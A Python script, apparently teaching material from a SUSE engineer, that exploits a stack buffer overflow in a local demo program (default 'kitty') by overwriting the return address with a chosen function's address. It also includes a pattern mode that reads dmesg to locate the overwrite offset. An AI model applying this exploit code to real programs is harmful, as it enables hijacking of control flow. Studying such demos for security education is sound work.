#!/usr/bin/python3

import argparse
import functools
import os
import subprocess
import sys

# Matthias Gerstner
# SUSE Linux GmbH
# matthias.gerstner@suse.com


def getFunctionAddressFromObjdump(prog, func):
    # try to find out the address of the function via objdump
    out = subprocess.check_output(["/usr/bin/objdump", "-t", prog])

    for line in out.decode().splitlines():

        parts = line.split()

        if not parts or parts[-1] != func:
            continue

        return parts[0]

    raise Exception("Failed to determine function adderss from objdump")


def getFunctionAddressFromGdb(prog, func):
    # more elaborate version that uses gdb to determine the runtime
    # address
    out = subprocess.check_output(
        [
            "/usr/bin/gdb", prog,
            "-ex", "start",
            "-ex", f"print {func}",
            "-batch"
        ]
    ).decode()

    lastline = out.splitlines()[-1].strip()

    var = None
    addr = None
    label = None

    for part in lastline.split():
        if not var:
            var = part
        elif not addr and part.startswith("0x"):
            addr = part
        elif not label and part[0] + part[-1] == "<>":
            label = part

    if not var or not addr or not label:
        raise Exception("Couldn't parse gdb output")

    if var != "$1" or label.strip('<>') != func:
        raise Exception("gdb parse error")

    return addr


def getFunctionAddress(prog, func):
    return getFunctionAddressFromGdb(prog, func)


def getSignalName(sig):
    import signal
    return signal.Signals(sig).name


def findSegfaultAddress(start_addr):
    dmesg_bin = None
    for cand in ("/usr/bin/dmesg", "/bin/dmesg"):
        if os.path.exists(cand):
            dmesg_bin = cand
            break

    if not dmesg_bin:
        raise Exception("No dmesg found")

    dmesg = subprocess.check_output([dmesg_bin])

    lines = dmesg.decode().splitlines()[-3:-1]
    lines.reverse()
    segfault_line = None

    for line in lines:

        if line.find("segfault at") != -1:
            segfault_line = line

    if not segfault_line:
        print("couldn't find segfault address in last dmesg line:", line)
        sys.exit(1)

    next_is_addr = False
    segfault_addr = None
    for part in segfault_line.split():
        if part == "at":
            next_is_addr = True
        elif next_is_addr:
            segfault_addr = int(part, 16)
            break

    if not segfault_addr:
        print("failed to extract segfault address from dmesg line:", segfault_line)
        sys.exit(1)

    print("segfault address was:", hex(segfault_addr))

    offset = segfault_addr - start_addr
    print("return address is", offset * 8, "bytes into overflow buffer")


parser = argparse.ArgumentParser(
    description="Tries to exploit a stack overflow by executing some other function on return."
)

parser.add_argument(
    "-p", "--program", help="The program to exploit. This needs to accept input on stdin that will lead to an overflow.",
    default="kitty"
)

parser.add_argument(
    "-f", "--function", help="Name of the function to call upon return.",
    default="zombie"
)

parser.add_argument(
    "-c", "--count", help="Number of times to feed to the desired return address to the exploitable program's stdin.",
    default=8,
    type=int
)

parser.add_argument(
    "-a", "--address", help="Use this specific address as return address.",
    type=functools.partial(int, base=16),
    default=None
)

parser.add_argument(
    "-w", "--pattern", help="Instead of calling a function, use a pattern for the stack overflow for exactly determining the return address location.",
    action='store_true',
    default=False
)

parser.add_argument(
    "-o", "--output", help="Instead of calling the vulnerable program, just output the exploit buffer to stdout.",
    action='store_true', default=False
)

args = parser.parse_args()

prog = args.program

if not os.path.isabs(prog):
    prog = os.path.join(os.getcwd(), prog)

if not os.path.exists(prog):
    print("Couldn't find program to exploit in", prog)
    sys.exit(1)

if args.pattern:
    overflow_data = bytes()

    # avoid null byte and newline(s)
    # we can't use all FF's because AMD64 only supports 48 bit addressing
    # and this would result in a general protection fault that doesn't
    # expose the violation address in dmesg so easily.
    start_addr = 0x0000FFFFFFFFFF + ord('A')
    for addr in range(start_addr, start_addr + args.count):
        addr_bin = addr.to_bytes(8, byteorder='little', signed=False)
        overflow_data += addr_bin
elif args.address:
    # use the provided address
    address_bin = args.address.to_bytes(
        8, byteorder='little', signed=False)
    overflow_data = args.count * address_bin
else:
    # obtain the function's address by inspecting the program
    addr = getFunctionAddress(prog, args.function)

    if not args.output:
        print(">>> Using function address", addr)
    addr = int(addr, 16)
    # transform into a binary representation of the 64-bit return address
    # we want to write onto the stack
    address_bin = addr.to_bytes(8, byteorder='little', signed=False)

    overflow_data = args.count * address_bin

if args.output:

    if os.isatty(sys.stdout.fileno()):
        # write as hexdump if stdout is a terminal
        for bt in overflow_data:
            print("\\x" + format(bt, '02x'), end='')

        print()
    else:
        # write as binary if stdout is something else
        os.write(sys.stdout.fileno(), overflow_data)

    sys.exit(0)

process = subprocess.Popen([prog], stdin=subprocess.PIPE)

process.stdin.write(overflow_data)
process.stdin.close()

res = process.wait()
print()
print(">>>", args.program, "exited with", res, end='')
if res == 0:
    print("didn't segfault")
    sys.exit(0)
elif res < 0:
    print(" ({})".format(getSignalName(abs(res))))
else:
    print()

if args.pattern:
    findSegfaultAddress(start_addr)
    sys.exit(0)
